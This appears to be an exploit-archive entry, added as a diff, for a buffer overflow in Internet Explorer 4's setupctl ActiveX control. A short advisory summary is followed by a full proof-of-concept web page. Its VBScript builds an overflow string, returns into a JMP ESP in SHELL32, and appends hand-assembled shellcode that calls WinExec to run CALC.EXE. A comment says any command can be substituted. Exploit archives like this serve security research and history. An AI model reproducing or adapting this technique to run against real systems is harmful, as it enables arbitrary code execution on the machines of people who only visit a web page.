@@ -1,0 +1,84 @@
+Microsoft Internet Explorer 4.0 for Windows 95/Windows NT 4 Setupctl ActiveX Control Buffer Overflow
+
+source: http://www.securityfocus.com/bid/667/info
+
+There is a buffer overflow in the setupctl ActiveX control that used to ship with some versions of Microsoft's Internet Explorer. This ActiveX control is used to link to an update site at Microsoft and is marked 'Safe for Scripting' . Arbitrary commands may be executed if the ActiveX control is run in a malicious manner. 
+
+SETUPCTL
+
+Apparently a control that was once used for the IE update 
+web site which is no longer in use, although it should 
+still exist on a lot of systems. With this exploit, similar 
+to the PDF exploit, ESP points to our code so we simply RET 
+to the same JMP ESP in Shell32. Also, this exploit differs 
+in that we set a property first (DistUnit) with the long 
+string, then call the method (InstallNow). Again, I have 
+simply demonstrated how to execute CALC.EXE, though any 
+code can be executed.
+
+
+<object classid="clsid:F72A7B0E-0DD8-11D1-BD6E-
+00AA00B92AF1" id = "setupctl">
+</object>
+
+<script language="vbscript"><!--
+
+msgbox("Setupctl 1.0 Type Library Buffer Overrun" + Chr(10) 
++ "Written by Shane Hird")
+
+expstr="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAA"
+
+expstr = expstr + Chr(235)	'Address in SHELL32, Win98 
+(7FD035EB) of JMP ESP
+expstr = expstr + Chr(53)	'You may need to use a 
+different address
+expstr = expstr + Chr(208)
+expstr = expstr + Chr(127)
+
+'NOP for debugging purposes
+expstr = expstr + Chr(144)
+
+'MOV EDI, ESP
+expstr = expstr + Chr(139) + Chr(252)
+
+'ADD EDI, 19h (Size of code)
+expstr = expstr + Chr(131) + Chr(199) + Chr(25)
+
+'PUSH EAX (Window Style EAX = 41414141)
+expstr = expstr + Chr(80)
+
+'PUSH EDI (Address of command line)
+expstr = expstr + Chr(87)
+
+'MOV EDX, BFFA0960 (WinExec, Win98)
+expstr = expstr + Chr(186) + Chr(96) + Chr(9) + Chr(250) + 
+Chr(191)
+
+'CALL EDX
+expstr = expstr + Chr(255) + Chr(210)
+
+'XOR EAX, EAX
+expstr = expstr + Chr(51) + Chr(192)
+
+'PUSH EAX
+expstr = expstr + Chr(80)
+
+'MOV EDX, BFF8D4CA (ExitProcess, Win98)
+expstr = expstr + Chr(186) + Chr(202) + Chr(212) + Chr(248) 
++ Chr(191)
+
+'CALL EDX
+expstr = expstr + Chr(255) + Chr(210)
+
+'Replace with any command + 0 (automatically appended)
+expstr = expstr + "CALC.EXE"
+
+'Run exploit
+setupctl.DistUnit = expstr
+setupctl.InstallNow
+
+--></script>
